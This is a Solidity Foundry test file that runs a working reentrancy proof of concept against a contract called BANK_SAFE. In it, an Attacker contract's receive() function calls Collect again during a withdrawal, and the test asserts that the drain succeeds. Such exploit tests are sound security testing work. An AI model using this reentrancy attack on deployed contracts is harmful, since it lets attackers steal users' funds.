
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/Test.sol";
import {BANK_SAFE, LogFile} from "../src/BANK_SAFE.sol";

contract TestReentrancyBANK_SAFE is Test {

    BANK_SAFE public bank;
    LogFile public log;

    Attacker public _attacker;

    function setUp() public {
        log = new LogFile();
        bank = new BANK_SAFE();
        bank.SetMinSum(1);
        bank.SetLogFile(address(log));
        bank.Initialized();
        
        _attacker = new Attacker(address(bank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1);
        vm.assume(attackVal <= type(uint128).max / 2);
        

        vm.deal(address(bank), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);
        
        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    BANK_SAFE public bank;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        bank = BANK_SAFE(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        bank.Deposit{value: msg.value}();
        storedVal = val;
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        storedVal = val;

        bank.Collect(val);

        uint256 finalBalance = address(this).balance;
        if (finalBalance >= initialSnapshot + val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            bank.Collect(storedVal);
        }
    }
}
